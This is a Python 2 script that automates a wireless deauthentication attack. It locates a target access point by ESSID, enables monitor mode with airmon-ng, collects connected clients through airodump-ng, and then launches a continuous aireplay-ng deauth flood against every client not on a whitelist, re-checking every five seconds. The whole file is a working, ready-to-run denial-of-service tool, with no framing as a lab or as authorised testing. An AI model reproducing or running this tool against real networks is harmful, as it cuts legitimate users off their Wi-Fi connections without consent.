#!/usr/bin/python

from parse_args import parse_args
from subprocess import Popen, PIPE
import csv
import re
import sys
import time

args = None
attack_clients = []
attack_pids = []

class apinfo:
	bssid = None
	channel = None
	power = None
	
	def isvalid(self):
		if not self.bssid or not self.channel or not self.power:
			return False
		return True

# extract all unique MAC addresses from an airodump csv output file (f)
def get_clients(f):
	clients = []
	regex = '^([0-9A-F]{2}:)+[0-9A-F]{2}$'
	with open(f, 'rb') as csvfile:
		reader = csv.reader(csvfile)
		for row in reader:
			if len(row) and re.match(regex, row[0]) and not row[0] in clients:
				clients.append(row[0])
	return clients

# find the BSSID of the strongest AP matching the specified ESSID
def get_ap_bssid():
	try:
		p = Popen(['iwlist', args.interface, 'scan'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
	except OSError as e:
		print e
		sys.exit()

	output, err = p.communicate()
	if p.returncode > 0:
		print err
		sys.exit()

	valid = False
	info = apinfo()
	
	lines = output.split('\n')
	for line in reversed(lines):
		l = line.strip()
		if not len(l):
			continue
		if l.startswith("ESSID"):
			valid = False
			m = re.search(re.compile('"(.*)"'), l)
			if m and m.group(1) == args.essid:
				valid = True
				continue
		if not valid:
			continue
		if l.startswith("Quality"):
			m = re.search(re.compile('level=([^\ ]+)'), l)
			if m and (not info.power or int(m.group(1)) > int(info.power)):
				info.power = m.group(1)
			else:
				valid = False
		elif l.startswith("Channel"):
			m = re.search(re.compile('Channel:([0-9]+)'), l)
			if m:
				info.channel = int(m.group(1))
			else:
				valid = False
		elif l.startswith("Cell"):
			m = re.search(re.compile('Address: ([0-9A-F:]+)$'), l)
			if m:
				info.bssid = m.group(1)
			else:
				valid = False
	if info.isvalid():
		return info
	return None

# brings up the wireless interface so it can be used. this has no effect if the interface is already up
def initialise_interface():
	try:
		p = Popen(['ifconfig', args.interface, 'up'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
	except OSError as e:
		print e
		sys.exit()
	output, err = p.communicate()
	if p.returncode > 0:
		print err
		sys.exit()

# create a monitoring interface using the specified wlan interface, on the specified channel
def create_monitor_interface(channel):
	try:
		p = Popen(['airmon-ng', 'start', args.interface, str(channel)], stdin=PIPE, stdout=PIPE, stderr=PIPE)
	except OSError as e:
		print e
		sys.exit()
	output, err = p.communicate()
	if p.returncode > 0:
		print err
		sys.exit()
	m = re.search(re.compile("monitor mode enabled on ([^\)]+)"), output)
	if m:
		return m.group(1)
	return None

# start (and detach from) the airodump process. it will regularly write its output to a csv file in /tmp/output
def start_airodump(iface, channel, bssid):
	ts = str(int(time.time()))
	try:
		p = Popen(['airodump-ng', iface, '-c', str(channel), '--bssid', bssid, '-w', '/tmp/airodump-output'+ts, '-o', 'csv'], 
					stdout=PIPE, stdin=PIPE, stderr=PIPE)
	except OSError as e:
		print e
		sys.exit()
	return p.pid, '/tmp/airodump-output'+ts+'-01.csv'

# spawn a new aireplay instance to attack a specific client
def spawn_attack(iface, c_bssid, ap_bssid):
	try:
		p = Popen(['aireplay-ng', '-0', '0', iface, '-c', c_bssid, '-a', ap_bssid, '--ignore-negative-one'], 
				stdout=PIPE, stdin=PIPE, stderr=PIPE)
	except OSError as e:
		print e
	return p.pid

# start the attack by spawning instances for each client on the network that's not in the whitelist
def start_attack(output, iface, bssid):
	while True:
		clients = get_clients(output)
		diff = list(set(clients) - set(attack_clients))
		for item in diff:
			if item != bssid and item not in args.whitelist:
				pid = spawn_attack(iface, item, bssid)
				attack_pids.append(pid)
		time.sleep(5)

if __name__ == "__main__":
	args = parse_args()
	print "Bringing up interface \""+args.interface+"\"..."
	initialise_interface()
	print "> OK"
	
	print "Finding BSSID for \""+args.essid+"\"..."
	info = get_ap_bssid()
	if not info:
		print "Failed to find BSSID for \""+args.essid+"\"! Check that the ESSID is correct and you're in range."
		sys.exit()
	print "> Found \""+args.essid+"\": BSSID="+info.bssid+", Channel="+str(info.channel)+", Power="+str(info.power)
	
	print "Creating monitoring interface on channel "+str(info.channel)+"..."
	mon = create_monitor_interface(info.channel)
	if not mon:
		print "Failed to create monitoring interface!"
		sys.exit()
	print "> Created monitoring interface "+mon

	print "Spawning airodump process..."
	pid,output = start_airodump(mon, info.channel, info.bssid)
	print "> airodump pid="+str(pid)+", writing to "+output
	
	print "Starting attack manager..."
	start_attack(output, mon, info.bssid)
	